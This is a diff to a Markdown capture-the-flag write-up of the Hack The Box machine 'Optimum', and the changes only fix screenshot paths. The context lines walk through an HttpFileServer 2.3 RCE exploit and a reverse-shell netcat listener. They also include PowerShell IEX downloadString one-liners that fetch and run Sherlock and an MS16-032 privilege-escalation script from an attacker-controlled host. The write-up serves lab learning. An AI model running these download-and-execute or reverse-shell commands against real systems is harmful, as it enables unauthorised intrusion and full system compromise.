@@ -17,7 +17,7 @@ nmap -sV -sC -oA nmap/optimum 10.10.10.8
 ```
 
 ###### Output 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/nmap.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/nmap.png)
 ```sh
 nmap -sV -sC -oA nmap/optimum 10.10.10.8                                                                                          ─╯
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 14:58 EAT
@@ -40,11 +40,11 @@ port[80]-  httpd 2.3
 
 so looking at the page [http//:10.10.10.8](http://10.10.10.8) we find there is a login page 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/landingpage.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/landingpage.png)
 
 when I try to login with default credential i find out that it fails but when i click at the HttpFileserver 2.3 it redirects to a [rejetto](http://www.rejetto.com/hfs/)
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/rejetto.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/rejetto.png)
 
 so we decide to search for the exploit 
 
@@ -54,15 +54,15 @@ so we decide to search for the exploit
 searchsploit HttpFileServer 2.3
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/searchsploit.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/searchsploit.png)
 
 as we can see their is an RCE exploit a python script so we examine the file
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/exploit.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/exploit.png)
 
 we then set a pthon server  which will be used to get our exploit to the machine 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/pythonserver.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/pythonserver.png)
 we can see that it exploits with the `%00`  null bytes but this scripts generates for us a url to execute a reverse shell on the machine.
 
 ```sh
@@ -83,15 +83,15 @@ nc -nvlp 1337
 
 then we get the  revershell 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/reverse.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/reverse.png)
 
 and we navigate with the python script generated above to the browser to get the shell.
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/browser.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/browser.png)
 
 we can then get the user flag from the user `kostas`
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/userflag.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/userflag.png)
 
 now that we get to find the user flag we can now do a privillage escalation to find the root flag 
 
@@ -99,7 +99,7 @@ now that we get to find the user flag we can now do a privillage escalation to f
 
 Just by looking at the `systeminfo` we get that their are hot fixes that where done to the machine
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/hotfix.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/hotfix.png)
 
 Now we search and find that their is script that checks for vulnerablitities of missing software patches for local privilege escalation vulnerabilities. [sherlork](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1) now we save the script and be able to execute if so that we can run.
 
@@ -109,32 +109,32 @@ from the script just copy the function find Allvulns and put at the end of the s
 IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/sherlork.ps1')
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/sherlork.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/sherlork.png)
 
 and it appears that `ms16-032 and some other 2` are vulnerable
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/ms16.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/ms16.png)
 
 so we search for an exploit using searchsploit and we get its vulnerabilty canbe done using different ways 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/searchsploit2.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/searchsploit2.png)
 
 after examining the code we find that it execute from cmd.exe now we find another exploit from [empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1) which has modification to execte from power shell. We just add the revershell at the end so that we can Invoke from the session again.
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/InvokeMs016.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/InvokeMs016.png)
 Now after that we set a new listner and we go and execute the from the session with this to get a shell of the `Nt Authority`
 
 ```sh
 IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/InvokeMs.ps1')
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/InvokeMs.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/InvokeMs.png)
 
 now after executing that a setting a listner we get root
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/root.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/root.png)
 now we get the root flag 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Optimum/Screenshots/rootflag.png)
+![](/Windows/Windows-Easy/Optimum/Screenshots/rootflag.png)
 
 	-------------------------END successful attack @lesley----------------------
